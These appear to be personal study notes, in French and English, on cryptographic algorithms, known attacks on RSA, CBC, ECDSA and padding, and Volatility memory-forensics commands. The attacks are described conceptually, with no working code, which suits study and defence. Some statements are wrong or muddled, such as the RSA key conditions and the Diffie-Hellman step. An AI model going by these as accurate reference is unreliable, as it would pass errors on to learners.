-   **RSA keys can be typically 1024 or 2048 bits long ( That number is
    > the number of bits in the modulus ), but experts believe that 1024
    > bit keys could be broken in the near future. But till now it seems
    > to be an infeasible task.**

-   **Note : Deux nombres entiers sont premiers entre eux si leur PGCD
    > (Plus Grand Commun Diviseur) vaut 1.**

-   ### Déroulement de l'algorithme :

    -   **Alice choisit deux grands entiers naturels premiers p et q
        > (d\'environ 100 chiffres chacun ou plus) et fait leur produit
        > n = p·q. Puis elle choisit un entier e tel que :**

        -   **e premier avec (p-1)·(q-1).**

        -   **e \< (p-1)(q-1).**

        -   **e premier avec n.**

        -   **e \< p et q.**

> **Enfin, elle publie dans un annuaire, par exemple**
>
> **sur le web, sa clef publique: (RSA, n, e).**
>
> **n est appelé module de chiffrement.**
>
> **e est appelé exposant de chiffrement.**

**Chiffrement :**

-   **Bob veut donc envoyer un message à Alice. Il cherche dans
    > l\'annuaire la clef de chiffrement qu\'elle a publiée.**

> **Il sait maintenant qu\'il doit utiliser le système RSA avec les deux
> entiers n et e.**
>
> **Il transforme en nombres son message en remplaçant par exemple
> chaque lettre par son rang dans l\'alphabet.**
>
> **Exemple :**
>
> **\"JEVOUSAIME\" devient : \"10 05 22 15 21 19 01 09 13 05\".**
>
> **Puis il découpe son message chiffré en blocs de même longueur
> représentant chacun un nombre plus petit que n.**
>
> **Il faut construire des blocs assez longs (par exemple si on laissait
> des blocs de 2 dans notre exemple), on retomberait sur un simple
> chiffre de substitution que l\'on pourrait attaquer par l\'analyse des
> fréquences.**
>
> **Imaginons dans notre exemple que son message devient : \"010 052 215
> 211 901 091 305\".**
>
> **Un bloc B est chiffré par la formule C = B\^e mod n, où C est un
> bloc du message chiffré que Bob enverra à Alice.**
>
> **Après avoir chiffré chaque bloc, le message chiffré s\'écrit :
> \"0755 1324 2823 3550 3763 2237 2052\".**
>
> **Déchiffrement :**

**Alice reçoit le message chiffré avec sa clef**

> **publique.**

-   **Alice calcule à partir de p et q, qu\'elle a gardé secret, la clef
    > d de déchiffrage (c\'est sa clef privée). Celle-ci doit satisfaire
    > l\'équation :**

> **e·d mod ( (p-1)(q-1) ) = 1.**
>
> **Ici, d=4279.**
>
> **Chacun des blocs C du message chiffré sera déchiffré par la formule
> B = C\^d mod n.**
>
> **d est appelé module de déchiffrement.**

-   **Elle retrouve : \"010 052 215 211 901 091 305\".**

> **Ainsi,** en regroupant **les chiffres deux par deux et en remplaçant
> les nombres ainsi obtenus par les lettres correspondantes, elle
> retourne le message d'origine.**

-   **RSA implementation may have vulnerabilities of its own even if the
    > used keys are secur**e

    -   ### Attacking RSA keys 

```{=html}
<!-- -->
```
-   ### **Modulus too small ( n )**

> **If the RSA key is too short, the modulus can be factored by just
> using brute force. At least, 1024-bit keys are required.**
>
> **( but may be possible for well equipped attackers to bruteforce this
> length of key ).**

-   ### **Low private exponent ( d )**

> **Decrypting a message consists of calculating C\^d mod N. The smaller
> d is, the faster this operation goes.**
>
> **However, *Wiener* found a way to recover d when d is relatively
> small.**
>
> ***Boneh* and *Durfee* improved this attack to recover private
> exponents that are less than N\^0.292.**
>
> **If the private exponent is small, the public exponent is necessarily
> large.**
>
> **If you encounter a public key with a large public exponent, it may
> be worth it to run the Boneh-Durfee attack against it.**

-   **Low public exponent ( e )**

> **﻿Having a low public exponent makes the system vulnerable to certain
> attacks if used incorrectly.**

-   **p and q close together**

> **﻿Consider what happens when p ≈ q. Then N ≈ p\^2 or p ≈ √N. In that
> case, N can be efficiently factored using Fermat's factorization
> method.**

-   **Unsafe primes**

> **﻿﻿If at least one of the primes conforms to certain conditions there
> is a shortcut to factor the result.**
>
> **In practice the chance is negligible that a prime you pick at random
> conforms to one of these formats.**

![](media/image423.png){width="6.267716535433071in" height="0.75in"}

-   **Unsafe random generator values**

**To create a random key, a good cryptographic**

> **random number generator is required. Some generators are
> deficient.**
>
> **For example, Devices that create their private key on first boot may
> not have enough entropy to create a random number. What sometimes
> happens is that this results in keys that have a different modulus but
> have one factor in common.**
>
> **In that case the greatest common divisor of the two modulus can be
> efficiently calculated to factor the modulus and recover the private
> key.**
>
> **In some cases, even if two keys don't have the exact same factor but
> the factor is close, both keys can be broken.**

-   **If you have :**

    -   **The message m1 encrypted with a PubKey1**

    -   **The message m1 encrypted with a PubKey2**

    -   **PubKey1 and PubKey2 have the same modulus.**

> **Then, you can recover the plain text m1 with the private key.**

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   **Faire attention au stockage des mots de passe de certains
    > logiciels ( Navigateur , ... ). Ils peuvent être retrouvés avec
    > certains utilitaires employé par un attaquant.**

```{=html}
<!-- -->
```
-   **Le chiffre de Vigenère est un système de chiffrement par
    > substitution polyalphabétique mais une même lettre du message
    > clair peut, suivant sa position dans celui-ci, être remplacée par
    > des lettres différentes, contrairement à un système de chiffrement
    > mono alphabétique comme le chiffre de César.**

```{=html}
<!-- -->
```
-   ## Bit-flipping attack

> **A bit-flipping attack is an attack on a cryptographic cipher in
> which the attacker can change the ciphertext in such a way as to
> result in a predictable change of the plaintext, although the attacker
> is not able to learn the plaintext itself.**
>
> **The attack is especially dangerous when the attacker knows the
> format of the message.**
>
> **Example On CBC:**

![](media/image237.png){width="6.267716535433071in"
height="2.7916666666666665in"}

> **CBC chiffrement : XOR then ALGO**
>
> **CBC déchiffrement : ALGO then XOR**
>
> **It's also dangerous when the attacker has access to the IV.**

-   ## CBC-MAC :

> **CBC-MAC is a method to ensure integrity of a message by encrypting
> it using CBC mode and keeping the last encrypted block as
> \"signature\".**
>
> **This ensures that a malicious user can not modify any part of the
> data without having to change the signature. The key used for the
> \"encryption\" ensures that the signature can\'t be guessed.**
>
> ![](media/image218.png){width="6.267716535433071in"
> height="2.638888888888889in"}

**CBC-MAC signature construction**

**It's recommended to choose an IV as NULL ( "00000000" ).**

![](media/image317.png){width="4.046875546806649in"
height="2.0704943132108484in"}

**Using CBC-MAC without some restrictions can break the security of
the**

**implementation :**

> **Example with username of 2 block :**

![](media/image290.png){width="7.476747594050743in"
height="4.0612893700787405in"}

![](media/image352.png){width="7.539247594050743in"
height="3.7195286526684166in"}

![](media/image78.png){width="7.5916130796150485in"
height="3.4427088801399823in"}

## 

## 

## 

## 

-   ## Mode opératoire CTR :

![](media/image231.png){width="5.889763779527559in" height="3.75in"}

-   Formule chiffrement : C\[n\] = Enc( key, NONCE\|\|counter) \^ M\[n\]

-   Formule déchiffrement : M\[n\] = Enc( key, NONCE\|\|counter) \^
    > C\[n\]

    -   Enc = AES, ...

    -   NONCE =\> 64 bits et counter =\> 64 bits pour des blocs de 128
        > bits

    -   counter = 1,2,3 .....

    -   à chaque nouveau chiffrement, la nonce doit être réinitialisé (
        > avec une autre valeur random )

```{=html}
<!-- -->
```
-   ## Mode opératoire ECB :

![](media/image99.png){width="5.666666666666667in" height="2.3125in"}

-   ## Diffie-Hellman

###  intro :

**l\'échange de clés Diffie-Hellman, du nom de ses auteurs**

> **Whitfield Diffie et Martin Hellman, est une méthode,**
>
> **publiée en 1976, par laquelle deux personnes peuvent se mettre
> d\'accord sur un nombre (qu\'ils peuvent utiliser comme clé pour
> chiffrer la conversation suivante) sans qu\'une troisième personne
> puisse découvrir le nombre, même en ayant écouté tous leurs échanges (
> sans rien modifier ).**
>
> **Cette idée valut en 2015 aux deux auteurs le prix Turing.**
>
> ![](media/image137.png){width="3.2718755468066494in"
> height="5.453125546806649in"}

-   ### Fonctionnement de Diffie-Hellman :

1)  **Alice et Bob ont choisi un nombre premier p fini et une base g
    > plus petit strictement que p (nombre pouvant être connu de
    > tous).**

2)  **Alice choisit un nombre au hasard a et initie un autre nombre A =
    > g\^a \[modulo p\]. Elle envoie A à Bob.**

3)  **Bob choisit un nombre au hasard b et initie un autre nombre B =
    > g\^b \[modulo p\]. Il envoie B à Bob.**

4)  **Alice, en calculant B\^a ( B reçu de Bob ), obtient g\^ba \[modulo
    > p\] = Secret.**

5)  **Bob, en calculant A\^b ( A reçu de Bob ), obtient g\^ab \[modulo
    > p\] = Secret.**

-   **Il est difficile d\'inverser l\'exponentiation dans un corps fini
    > (ou sur une courbe elliptique quand elle est utilisée),
    > c'est-à-dire de calculer le logarithme discret:**

```{=html}
<!-- -->
```
-   **Dans la description ci-dessus, Alice et Bob travaillent dans le
    > corps fini Z/pZ, ils échangeront les nombres modulo p.**

> **De manière générale, l\'échange de clés Diffie-Hellman se généralise
> à un groupe fini cyclique quelconque (au lieu de se mettre d\'accord
> sur un nombre premier p, ils se mettent d\'accord sur un groupe
> fini).**
>
> **Ce groupe fini peut être un corps fini dont ils n\'utilisent que la
> multiplication, ou une courbe elliptique.**
>
> **équation courbe elliptique :**
> ![](media/image113.png){width="1.6770833333333333in"
> height="0.2916666666666667in"}
>
> **( le 2eme x n'est pas au carré )**

###  DH avec courbe elliptique : 

![](media/image140.png){width="6.177083333333333in"
height="3.2708333333333335in"}

![](media/image23.png){width="6.267716535433071in"
height="1.3472222222222223in"}

-   **Dans E(a,b,K), K est un corps fini auquel appartient x et y.**

```{=html}
<!-- -->
```
-   **Transmission de message avec un algo. de chiffrement par courbe
    > elliptique:**

    -   **Alice veut envoyer à Bob un message.**

    -   **Bob commence par fabriquer une clé publique de la façon
        > suivante: il choisit une courbe elliptique E(a,b,K), un point
        > P de la courbe, et un entier kB.**

> **Sa clé publique est constituée par la courbe elliptique E(a,b,K) et
> par les points P et kB\*P de cette courbe elliptique.**
>
> **Sa clé privée est l\'entier kB.**

![](media/image95.png){width="6.267716535433071in"
height="4.388888888888889in"}

-   **Nous avons passé sous silence une difficulté majeure : si on veut
    > s\'échanger un texte, il faut pouvoir le transformer en une suite
    > de points de la courbe elliptique. Ceci est loin d\'être trivial,
    > car il n\'est pas toujours facile de trouver des points sur une
    > courbe elliptique.**

-   **Comme les calculs sur les courbes elliptiques ne sont pas bien
    > compliqués à réaliser, c\'est un gros avantage pour les cartes à
    > puces où on dispose de peu de puissance, et où la taille de la clé
    > influe beaucoup sur les performances.**

-   **Ce qui fait la différence des algorithmes de chiffrement à base de
    > courbes elliptiques par rapport aux algorithmes basés sur les
    > entiers comme RSA ou El-Gamal est que, pour les vaincre, il faut
    > résoudre le logarithme discret sur le groupe de la courbe
    > elliptique, et non un problème analogue sur les entiers.**

> **C\'est pourquoi on estime qu\'une clé de 200 bits (qui mesure, pour
> une courbe elliptique, la taille du corps fini K de cette courbe) pour
> les chiffres basés sur les courbes elliptiques est plus sûre qu\'une
> clé de 1024 bits pour le RSA.**

-   **Les inconvénients sont de deux ordres. D\'une part, la théorie des
    > fonctions elliptiques est complexe, et encore relativement
    > récente. Il n\'est pas exclu que des trappes permettent de
    > contourner le problème du logarithme discret.**

> **D\'autre part, la technologie de cryptographie par courbe elliptique
> a fait l\'objet du dépôt de nombreux brevets à travers le monde. Cela
> peut rendre son utilisation très coûteuse !**

![](media/image366.png){width="5.835589457567804in"
height="2.327632327209099in"}

-   **Ce protocole ( DH ) est vulnérable à « l\'[attaque de l\'homme du
    > milieu](https://fr.wikipedia.org/wiki/Attaque_de_l%27homme_du_milieu)
    > » ( exemple sans C.Elliptique ):**

    -   **Un attaquant peut se placer entre Alice et Bob, intercepter la
        > clé g\^a envoyée par Alice et envoyer à Bob une autre clé
        > g\^a\', se faisant passer pour Alice.**

```{=html}
<!-- -->
```
-   **De même, il peut remplacer la clé g\^b envoyée par Bob à Alice par
    > une clé g\^b\', se faisant passer pour Bob.**

```{=html}
<!-- -->
```
-   **L\'attaquant communique ainsi avec Alice en utilisant la clé
    > partagée g\^ab\' et communique avec Bob en utilisant la clé
    > partagée g\^a\'b, Alice et Bob croient communiquer directement.**

> **La parade classique à cette attaque consiste à signer les échanges
> de valeurs à l\'aide d\'une paire de clés asymétriques certifiées.**

-   ## AES ( Advanced Encryption Standard )

```{=html}
<!-- -->
```
-   **AES is at least six times faster than triple DES.**

> **A replacement for DES was needed as its key size was too small. With
> increasing computing power, it was considered vulnerable against
> exhaustive key search attack. Triple DES was designed to overcome this
> drawback but it was found slow.**

-   **Longueur des blocs : 128 bits en général( 16 bytes ) ou 64 bits**

> **longueur de la clé : 128/192/256-bit**

**The schematic of AES structure**

![](media/image397.png){width="6.267716535433071in"
height="4.319444444444445in"}

-   **Each round comprises four sub-processes. The first round process
    > is depicted below :**

![](media/image389.png){width="4.635416666666667in" height="3.4375in"}

![](media/image25.gif){width="5.923433945756781in"
height="3.3293777340332458in"}

-   **Byte Substitution (SubBytes)**

**The 16 input bytes are substituted by looking up a fixed table (S-box)
given in**

**design. The result is in a matrix of four rows and four columns.**

-   **Shiftrows**

**Each of the four rows of the matrix is shifted to the left. Any
entries that 'fall off' are re-inserted on the right side of the row.**

-   **MixColumns**

**Each column of four bytes is now transformed using a special
mathematical function. This function takes as input the four bytes of
one column and outputs four completely new bytes, which replace the
original column. The result is another new matrix consisting of 16 new
bytes. It should be noted that this step is not performed in the last
round.**

-   **Addroundkey**

**The 16 bytes of the matrix are now considered as 128 bits and are
XORed to the 128 bits of the round key. If this is the last round then
the output is the ciphertext. Otherwise, the resulting 128 bits are
interpreted as 16 bytes and we begin another similar round.**

-   **Les clés de l\'AES font 128,192 ou 256 bits. Chacune correspondant
    > à un nombre de répétition du chiffrement.**

> **Ces clés sont étendues ( key schedule ). D\'autres clés sont créées
> à partir de la clé initiale ( pour chaque tours ).** Finalement,
> **c'est comme si "une grande clef" qui est utilisée.**
>
> **Extension d'une clef 128 bits**

![](media/image183.png){width="6.267716535433071in"
height="1.9444444444444444in"}

> **Avec Wi = la colonne i (4 octets) de la clef représentée par une
> matrice.**

-   **g(): une fonction linéaire spéciale définie.**

```{=html}
<!-- -->
```
-   **Now, for AES256, the first two round keys are, in fact, 256 bits
    > taken directly from the AES key. After that, it computed the next
    > round key based on a simple function of the previous two round
    > keys (plus a per round constant)**

```{=html}
<!-- -->
```
-   **The process of decryption of an AES ciphertext is similar to the
    > encryption process in the reverse order.**

```{=html}
<!-- -->
```
-   **There are no known \"efficient\" attacks on full AES. This means
    > that if you want to break the 10 rounds of AES-128, you will
    > probably have to do a brute-force attack (or something close to
    > that).**

```{=html}
<!-- -->
```
-   **If we use less than 10-round, it's dangerous.**

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## PKCS#5 and PKCS#7 padding :

> ![](media/image145.png){width="6.267716535433071in"
> height="2.4027777777777777in"}
>
> **If the length of the original data is an integer multiple of the
> block size B, then an extra block of bytes with value B ( size of one
> block ) is added.**

-   **The difference between the PKCS#5 and PKCS#7 padding mechanisms is
    > the block size; PKCS#5 padding is defined for 8-byte block sizes,
    > PKCS#7 padding would work for any block size from 1 to 255
    > bytes.**

**So fundamentally PKCS#5 padding is a subset of PKCS#7 padding**

> **for 8 byte block sizes.**

-   ## Perfect Forward Secrecy ( PFS ): 

> **La propriété de forward secrecy permet à une information chiffrée
> aujourd'hui de rester confidentielle en cas de compromission future de
> la clef privée d'un correspondant ( en utilisant l\'aspect "Éphémère"
> dans TLS par exemple ).**
>
> **À noter que l\'implémentation de cette propriété coûte une partie
> dans le temps de calcul.**

##  Hash length attack extension

![](media/image381.png){width="7.825172790901138in"
height="6.538308180227472in"}

![](media/image124.png){width="6.53125in" height="0.4322922134733158in"}

> **Algorithms like MD5, SHA-1, and SHA-2 that are based on the
> Merkle--Damgård construction are susceptible to this kind of
> attack.The SHA-3 algorithm is not susceptible.**
>
> [**[https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks]{.underline}**](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)

## 

## Liste d'Algo de générateur de nombres pseudo-aléatoires

+-----------------------------------+-----------------------------------+
| **Mersenne Twister**              | **L'algorithme est basé sur un    |
|                                   | TGSFR (twisted generalised shift  |
|                                   | feedback register, un type        |
|                                   | particulier de registre à         |
|                                   | décalage à rétroaction).**        |
|                                   |                                   |
|                                   | **Sa période est de 2\^19937 −    |
|                                   | 1.**                              |
|                                   |                                   |
|                                   | **Si on a les éléments d'une      |
|                                   | suite, les éléments suivants sont |
|                                   | prédictibles avec cette algo.**   |
+===================================+===================================+
| **Berlekamp-Massey**              |                                   |
+-----------------------------------+-----------------------------------+
| **Reed-Sloane**                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

> **In computer security, a side-channel attack is any attack based on
> information gained from the implementation of a computer system,
> rather than weaknesses in the implemented algorithm itself (e.g.
> cryptanalysis and software bugs). Timing information, power
> consumption, electromagnetic leaks or even sound can provide an extra
> source of information, which can be exploited.**

-   ## ECDSA (\"Elliptic Curve Digital Signature Algorithm\")

```{=html}
<!-- -->
```
-   **Les avantages de ECDSA sur DSA et RSA sont des longueurs de clés
    > plus courtes et des opérations de signature et de chiffrement plus
    > rapides.**

```{=html}
<!-- -->
```
-   **ECDSA est l'algorithme de signature électronique à clé publique
    > utilisé par Bitcoin.**

**Génération des clés pub/priv :**

![](media/image238.png){width="6.267716535433071in"
height="4.263888888888889in"}

![](media/image306.png){width="6.267716535433071in"
height="1.5694444444444444in"}

![](media/image214.png){width="6.267716535433071in"
height="3.2083333333333335in"}

**k is named a nonce here.**

**En effet, le fait que le logarithme discret ( sur courbe elliptique )
soit un problème difficile nous assure qu'un attaquant ne pourra pas
retrouver la clé privé de Bob en un temps raisonnable**

![](media/image75.png){width="6.267716535433071in"
height="2.5416666666666665in"}

**Attack on ECDSA :**

-   **Recovering secret keys from reused nonces :**

    -   **if a signer ever releases a signature and also releases the
        > nonce they used, an attacker can immediately recover the
        > secret key.**

```{=html}
<!-- -->
```
-   **Even if the signer keeps every nonce secret, if they accidentally
    > repeat a single nonce (even for different messages), the secret
    > key can immediately be recovered as well.**

## Algorithme RC4 :

**RC4 est un algorithme de chiffrement par flux (par flot ou encore sans
état) à clésymétrique développé en 1987 par Ronald Rivest (l'un des
créateurs du RSA). C'est un générateur de bits pseudo-aléatoires dont le
résultat est combiné avec le texte en clair via une opération XOR.**

**Son nom signifie : Ron's Code #4 ou encore Rivest Cipher #4.**

**Il utilise différentes tailles de clé, couramment jusqu'à 256 bits.**

**RC4 ne nécessite pas trop de puissance de calcul. Il est extrêmement
rapide (environ 10x plus rapide que le DES).**

**Cet algorithme reprend le principe du masque jetable (OTP -- One Time
Pad ou masque de Vernam). En effet, on génère un flux de données de
taille identique au flux de données claires et on fait un XOR entre les
deux, le déchiffrement se fait par XOR entre le chiffré et le même flux
pseudo-aléatoire.**

##  EDDSA

-   **EdDSA (anglais : Edwards-curve Digital Signature Algorithm
    > (algorithme de signature numérique Courbe d\'Edwards), à ne pas
    > confondre avec ecDSA), est, dans le domaine de la cryptographie
    > asymétrique, un schéma de signature numérique utilisant une
    > variante de la cryptographie sur les courbes elliptiques basée sur
    > les courbes d\'Edwards tordues. Il a été conçu pour fournir de
    > bonnes performances tout en évitant les problèmes de sécurité qui
    > sont apparus dans les autres schémas de signatures
    > électroniques.**

##  DES

-   **The Data Encryption Standard (DES) is an algorithm that was
    > adopted as an official standard in 1977 in the US. The original
    > proposal was modified slightly to strengthen against differential
    > cryptanalysis, but also significantly weakened against brute-force
    > attacks, particularly as a result of the reduction of key size to
    > 56 bits. With enough horsepower, it was only a matter of time
    > before a key-search machine, capable of rapidly computing every
    > possible key, in turn, was able to break DES. DES supports 8-byte
    > keys.**

##  An Initialization Vector (IV)

**-In cryptography, an Initialization Vector (IV) is a nonce used to
randomize the encryption, so that even if multiple messages with
identical plaintext are encrypted, the generated corresponding
ciphertexts will each be distinct.**

**Unlike the Key, the IV usually does not need to be secret, rather it
is important that it is random and unique. In fact, in certain
encryption schemes the IV is exchanged in public as part of the
ciphertext.**

**Reusing the same Initialization Vector with the same Key to encrypt
multiple plaintext blocks allows an attacker to compare the ciphertexts
and then, with some assumptions on the content of the messages, to gain
important information about the data being encrypted.**

**The consequences of reusing the same IV-Key pair depend on the actual
cipher and mode used :**

+-----------------------------------+-----------------------------------+
| **CBC,CFB**                       | **The leaks of information from   |
|                                   | the first block and commonalities |
|                                   | are enough to lead an empowered   |
|                                   | attacker to fully compromising    |
|                                   | the encryption layer of           |
|                                   | protection in the given system**  |
+===================================+===================================+
| **OFB,CTR,GCM**                   | **IV reuse renders encryption     |
|                                   | practically useless as given two  |
|                                   | ciphertexts their XOR yields the  |
|                                   | same result of XOR-ing the two    |
|                                   | corresponding plaintexts.**       |
|                                   |                                   |
|                                   | **Cypher1 \^ Cypher2 = Clair1 \^  |
|                                   | Clair2**                          |
+-----------------------------------+-----------------------------------+

![](media/image115.png){width="5.791338582677166in"
height="1.4166666666666667in"}

-   ## Padding oracle attacks :

-   ### Définition :

> **Padding Oracle Attacks arise due to a vulnerability in the
> decryption validation process of Cipher-Block Chaining (CBC) encrypted
> messages (published back in 2002).**
>
> **However, given a significant percentage of web clients still support
> unsafe cipher modes, the technique, as well as adaptations of and
> extensions to the original methodology, persist (found close to 100
> TLS Padding Oracle Attack variations in the wild in just 2019
> alone).**
>
> **In the case of Padding Oracle Attacks, a malicious actor exploits
> the verifiable padding data at the end of the block by continually
> sending specially crafted messages against the cipher and relying on
> the error messages returned to determine the correctness of the
> messages.**

![](media/image186.png){width="5.988188976377953in"
height="2.7777777777777777in"}

![](media/image249.png){width="5.988188976377953in"
height="2.861111111111111in"}

**A padding oracle is present if an application leaks this specific
padding**

**error condition for encrypted data provided by the client.**

**Knowing whether or not a given ciphertext produces plaintext with
valid**

**padding is ALL that an attacker needs.**

**The reason it works in CBC mode is that we can make predictable,**

**arbitrary changes to the plaintext of the last block by modifying
the**

**ciphertext (of the second to last block, or the IV). For another
mode**

**to be vulnerable, the same kind of control would be needed.**

###  Prévention 

-   **Make sure that an Oracle doesn't exist.**

```{=html}
<!-- -->
```
-   **Verify that known insecure block modes (i.e. ECB, etc.) and
    > padding modes (i.e. PKCS#1 v1.5, etc.) are not used. Verify that
    > all cryptographic modules fail securely, and errors are handled in
    > a way that does not enable Padding Oracle attacks.**

![](media/image158.png){width="6.219459755030621in"
height="0.9843755468066492in"}

-   ## GCM ( Galois Counter Mode )

-   **GCM ( Galois Counter Mode ) includes an authentication
    > mechanism.**

**Galois/Counter Mode (GCM) est un mode d\'opération de chiffrement par
bloc en cryptographie symétrique. Il est relativement répandu en raison
de son efficacité et de ses performances.**

**C\'est un algorithme de chiffrement authentifié conçu pour fournir à
la fois l\'intégrité et l\'authenticité des données, ainsi que la
confidentialité.**

**GCM est défini pour les chiffrements par bloc avec des tailles de bloc
de 128 bits.**

![](media/image73.png){width="8.185764435695537in"
height="2.3489588801399823in"}

-   ## Le Salt

> \- **Le salage, est une méthode permettant de renforcer la sécurité
> des informations qui sont destinées à être hachées (par exemple des
> mots de passe) en y ajoutant une donnée supplémentaire afin d'empêcher
> que deux informations identiques conduisent à la même empreinte (la
> résultante d'une fonction de hachage).**
>
> **Le but du salage est de lutter contre les attaques par analyse
> fréquentielle, les attaques utilisant des rainbow tables**. **Pour ces
> deux dernières attaques, le salage est efficace quand le sel utilisé
> n'est pas connu de l'attaquant ou lorsque l'attaque vise un nombre
> important de données hachées toutes salées différemment.**
>
> Le salt est généralement une donnée publique. Il ne prévient pas
> lui-même des attaques de type bruteforce. c'est une valeur unique
> stockée généralement avec le hash
>
> Un salt non public peut être appelé un "Pepper". Lui peut prévenir des
> attaques de type brute force utilisant des wordlists classiques.

## MISC

-   Si l\'on chiffre en utilisant la clef privée alors on peut
    > déchiffrer en utilisant la clef publique.

```{=html}
<!-- -->
```
-   Un HMAC ( *keyed-hash message authentication code )* est un type de
    > code d\'authentification de message (CAM), ou MAC en anglais
    > (message authentication code), calculé en utilisant une fonction
    > de hachage cryptographique en combinaison avec une clé secrète.

> Il peut être utilisé pour vérifier simultanément l\'intégrité de
> données et l\'authenticité d\'un message.
>
> La qualité cryptographique du HMAC dépend de la qualité
> cryptographique de la fonction de hachage et de la taille et la
> qualité de la clé.
>
> Formule d'un HMAC :
>
> ![](media/image374.png){width="4.3125in"
> height="0.6458333333333334in"}

-   \"\|\|\" désigne une concaténation.

```{=html}
<!-- -->
```
-   ipad et opad, chacune de la taille d\'un bloc, sont définies par :
    > ipad = 0x363636\...3636 et opad = 0x5c5c5c\...5c5c.

-   Lorsque que l'on utilise le système de Signature Digitale ( Hash +
    > signature avec la clef privé ), le Hash est la QUE pour réduire la
    > taille des calculs !

```{=html}
<!-- -->
```
-   Dans un protocole cryptographique classique ( utilisation
    > Symétrie/asymétrie/signature ) Il y a plusieurs choix dans l'ordre
    > des calculs :

    -   Encrypt-then-sign

> Envoyer : c = algo_sym( m ) \| s = algo_asym( hash(c) )

-   Encrypt-and-sign

    -   Envoyer : c = algo_sym(m) \| s = algo_asym( hash(m) )

-   Sign-then-Encrypt

    -   Envoyer : algo_sym( m \| s = algo_asym(hash(m)) )

> Chacune des méthodes a ses avantages et inconvénients et cela peut
> causer des failles de sécurité importantes si on choisi l'un plutôt
> que l'autre.
>
> Mais de manière générale, le meilleur est Sign-then-Encrypt

-   En cryptanalyse, une attaque temporelle consiste à estimer et
    > analyser le temps mis pour effectuer certaines opérations
    > cryptographiques dans le but de découvrir des informations
    > secrètes. La mise en œuvre de ce genre d\'attaque est intimement
    > liée au matériel ou au logiciel attaqué.

```{=html}
<!-- -->
```
-   Modern cryptographic protocols often require frequent generation of
    > random quantities. Cryptographic attacks that subvert or exploit
    > weaknesses in this process are known as random number generator
    > attacks.

```{=html}
<!-- -->
```
-   Virtual HSM (VHSM) is a software suite for storing and manipulating
    > secret data outside the virtualized application environment. While
    > HSM is a physical device connected to the computer, this software
    > provides HSM functionality through the PKCS#11 API in a virtual
    > environment based on OpenVZ container technology.

# Forensic

## Some tools and command

+-----------------------------------+-----------------------------------+
| **Dumpzilla**                     | **Available on Kali, this         |
|                                   | application is developed in       |
|                                   | Python 3.x and has as purpose     |
|                                   | extract all forensic interesting  |
|                                   | information of Firefox, Iceweasel |
|                                   | and Seamonkey browsers to be      |
|                                   | analyzed.**                       |
+===================================+===================================+
| **Autopsy**                       | **Très intéressant et facile      |
|                                   | d'utilisation sur Windows pour    |
|                                   | analyser des dumps**              |
+-----------------------------------+-----------------------------------+
| **pypykatz**                      | **analyse DMP file.**             |
+-----------------------------------+-----------------------------------+
| **Process Hacker ( on Windows )** | **Allow you to see all processes  |
|                                   | running on your machine with some |
|                                   | informations ( owner,             |
|                                   | description, command line ( file  |
|                                   | path ), ... )**                   |
+-----------------------------------+-----------------------------------+
| **oledump.py**                    | **oledump.py is a program to      |
|                                   | analyze OLE files.**              |
|                                   |                                   |
|                                   | **Many applications use this file |
|                                   | format, the best known is MS      |
|                                   | Office. .doc, .xls, .ppt, ...**   |
+-----------------------------------+-----------------------------------+
| **bulk-extrator \[IMAGE_FILE\] -o | **bulk_extractor is a program     |
| \[OUTPUT_REPO\]**                 | that extracts features such as    |
|                                   | email addresses, credit card      |
|                                   | numbers, URLs, and other types of |
|                                   | information from digital evidence |
|                                   | files**                           |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   ## Volatility

```{=html}
<!-- -->
```
-   **Syntax Volatility command :**

> ![](media/image385.png){width="5.177083333333333in"
> height="0.4895833333333333in"}

### Some Volatility command and plugin

+-----------------------------------+-----------------------------------+
| **volatility -f \[DUMP_FILE\]     | -   **identify some OS profiles** |
| imageinfo**                       |                                   |
|                                   | -                                 |
+===================================+===================================+
| **volatility -f ch2.dmp           | **Dumper les Hives ( Windows )**  |
| \--profile=Win7SP1x86 hivelist**  |                                   |
|                                   | **\--profile : Pour que Volat.    |
|                                   | interprète bien le fichier en     |
|                                   | entrée**                          |
+-----------------------------------+-----------------------------------+
| **volatility \--info \| more**    | **You Can list all available      |
|                                   | plugins with this command (       |
|                                   | adding a quick description of     |
|                                   | each one of them )**              |
+-----------------------------------+-----------------------------------+
| **volatility -f \[DUMP_FILE\]     | **Provide more information than   |
| \--profile=\[PROFILE\] kdgbscan** | imageinfo but it's more slow**    |
+-----------------------------------+-----------------------------------+
| **volatility -f \[DUMP_FILE\]     | **List all processes. psscan      |
| \--profile=\[PROFILE\] pslist \>  | provide more information (        |
| file.txt**                        | terminated,unlinked and hidden    |
|                                   | processus, ... )**                |
|                                   |                                   |
|                                   | **It worth to look if a process   |
|                                   | appear with psscan and not with   |
|                                   | pslist.**                         |
+-----------------------------------+-----------------------------------+
| **pstree**                        | **To view the process listing in  |
|                                   | tree form, use the pstree         |
|                                   | command. This enumerates          |
|                                   | processes using the same          |
|                                   | technique as pslist.**            |
+-----------------------------------+-----------------------------------+
| **psxview**                       | **Aids in discovering hidden      |
|                                   | processes.**                      |
|                                   |                                   |
|                                   | **This plugin compares the active |
|                                   | processes indicated within        |
|                                   | psActiveProcessHead ( associated  |
|                                   | with pslist ) with any other      |
|                                   | possible sources within the       |
|                                   | memory image**                    |
+-----------------------------------+-----------------------------------+
| **malfind**                       | **famous plugin that find hidden  |
|                                   | or injected code/DLLs in user     |
|                                   | mode memory**                     |
+-----------------------------------+-----------------------------------+
| **moddump**                       | **Extract Executables, drivers    |
|                                   | from kernel memory**              |
+-----------------------------------+-----------------------------------+
| **DLLdump**                       | **Dumping DLLs from memory**      |
+-----------------------------------+-----------------------------------+
